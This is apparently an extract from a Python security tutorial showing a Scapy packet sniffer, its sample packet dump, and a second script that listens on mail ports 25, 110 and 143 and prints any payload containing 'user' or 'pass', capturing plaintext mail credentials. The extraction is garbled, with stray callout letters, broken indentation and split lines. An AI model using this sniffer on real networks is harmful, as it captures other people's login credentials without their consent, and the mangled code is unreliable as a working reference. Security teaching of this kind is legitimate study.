
#mail_sniffer

from scapy.all import *
# our packet callback
u def packet_callback(packet):
print packet.show()
# fire up our sniffer
v sniff(prn=packet_callback,count=1)
$ python2.7 mail_sniffer.py
WARNING: No route found for IPv6 destination :: (no default route?)
###[ Ethernet ]###
dst = 10:40:f3:ab:71:02
src = 00:18:e7:ff:5c:f8
type = 0x800
###[ IP ]###
version = 4L
ihl = 5L
tos = 0x0
len = 52
id = 35232
flags = DF
frag = 0L
ttl = 51
proto = tcp
chksum = 0x4a51
src = 195.91.239.8
dst = 192.168.0.198
\options \
###[ TCP ]###
sport = etlservicemgr
dport = 54000
seq = 4154787032
ack = 2619128538
dataofs = 8L
reserved = 0L
flags = A
window = 330
chksum = 0x80a2
urgptr = 0
options = [('NOP', None), ('NOP', None), ('Timestamp', (1960913461,¬
764897985))]
None

from scapy.all import *
# our packet callback
def packet_callback(packet):
 if packet[TCP].payload:
mail_packet = str(packet[TCP].payload)
 if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
print "[*] Server: %s" % packet[IP].dst
 print "[*] %s" % packet[TCP].payload
# fire up our sniffer
 sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_¬
callback,store=0)
